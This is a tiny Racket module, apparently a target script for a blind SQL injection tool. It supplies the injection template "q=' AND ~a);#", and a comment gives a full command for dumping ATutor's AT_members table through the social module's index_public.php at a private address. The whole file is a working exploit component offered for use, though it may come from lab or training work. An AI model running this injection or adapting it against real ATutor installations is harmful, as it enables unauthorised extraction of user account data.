#lang racket

(provide generate-string)


#|

Command to run:

`racket blind-sql.rkt -d atutor -t AT_members -s "Offensive" dump-table GET 192.168.153.103 /ATutor/mods/_standard/social/index_public.php script:examples/atutor-basic.rkt`

|#

(define generate-string
  (lambda (host)
    "q=' AND ~a);#"))

